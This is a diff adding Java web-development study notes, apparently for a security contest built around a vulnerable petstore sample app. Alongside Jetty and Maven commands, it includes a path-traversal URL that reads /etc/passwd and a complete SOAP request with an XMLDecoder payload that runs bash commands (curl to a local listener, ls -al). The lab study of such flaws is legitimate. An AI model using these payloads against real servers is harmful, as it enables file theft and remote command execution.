@@ -556,3 +556,108 @@ limitation:
 4. static type constraints;
 
 
+
+
+### start with spring (without web container)
+embedded server 
+
+maven embedded server with jetty:
+```shell
+mvn clean jetty:run
+mvn jetty:run-war
+```
+if you choose to run with jetty, some of your source directory are supposed to be transformed to jetty-style, as well as the source code.
+
+### EJB
+enterprise java bean
+
+development architecture for building enterprise web application
+
+
+### why there are so many configuration files in java web application
+
+1.code reuse
+2.hierarchy and package separation
+3.cooperation among the groups
+
+
+### dynamic injection
+
+
+
+
+### spring framework and spring boot
+
+
+
+
+### play with j2ee sample application: petstore
+
+deploy:
+```shell
+mvn package -DskipTests
+mvn jetty:run-war -Dwar.location=web/target/contest1.war
+```
+
+
+
+http://localhost:8081/contest_web_war/store/file.htm?action=fileAction
+
+
+http://localhost:8081/contest_web_war/store/order_list.htm?action=fileAction&path=/etc/passwd&eventSubmitDoDownload=true&file=/etc/passwd
+
+http://localhost:8081/contest_web_war/store/view_cart.htm?action=cartAction&itemId=EST-16&eventSubmitDoRemoveItem=true
+
+http://localhost:8081/contest_web_war/store/item_list.htm?action=cartAction&itemId=EST-16&eventSubmitDoRemoveItem=true
+
+
+payload for petstore-2:
+
+**xml-decoder vulnerability:**
+
+exploit:
+
+```
+POST /contest_web_war/services/StoreManagerWebServiceXML?wsdl HTTP/1.1
+Host: 127.0.0.1:7001
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+SOAPAction: getCartItems
+Content-Type: text/xml
+Content-Length: 709
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<getCartItems>
+<getCartItemsRequest>
+<![CDATA[<java version="1.4.0" class="java.beans.XMLDecoder">
+    <new class="java.lang.ProcessBuilder">
+        <array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>curl 127.0.0.1:9998</string></void></array>
+<method name="start" />
+    </new>
+</java>]]>
+</getCartItemsRequest>
+</getCartItems>
+</soapenv:Body>
+</soapenv:Envelope>
+```
+
+source:
+server-config.wsdd
+storeManagerWebServiceXMLImpl.java
+
+### understanding java rmi
+java remote method invocation, is akin to the RPC, with the support for transfer of serialized java classes and distributed garbage-collection
+
+
+<array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>ls -al</string></void></array>
+
+
+
+### java json exploit (take the fast json as an example)
